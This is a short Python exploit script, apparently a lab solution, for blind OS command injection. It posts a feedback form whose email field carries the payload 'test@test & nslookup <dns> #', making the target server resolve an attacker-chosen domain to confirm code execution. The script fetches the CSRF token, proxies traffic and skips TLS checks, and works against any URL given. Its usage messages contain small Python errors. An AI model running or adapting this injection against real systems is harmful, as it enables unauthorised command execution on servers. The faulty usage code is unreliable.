import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url+feedback_path, verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def check_dns_lookup(s, url, dns):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test & nslookup '+dns+' #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf' : csrf_token, 'name' : 'test', 'email' : command_injection,'subject': 'test','message':'test'}
    res = s.post(url+submit_feedback_path,data=data, verify=False, proxies=proxies)
    print("(+) Check your domain log for lookup")

def main():
    if len(sys.argv) != 3:
        print("(+) Usage : %s <url> <dns server> ") % sys.argv[0]
        print("(+) Example: %s www.example.com" "xyz.net" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    dns = sys.argv[2]
    print("(+) testing Blind OS command injection with out-of-band interaction")
    s = requests.session()
    check_dns_lookup(s, url, dns)

if __name__ == '__main__':
    main()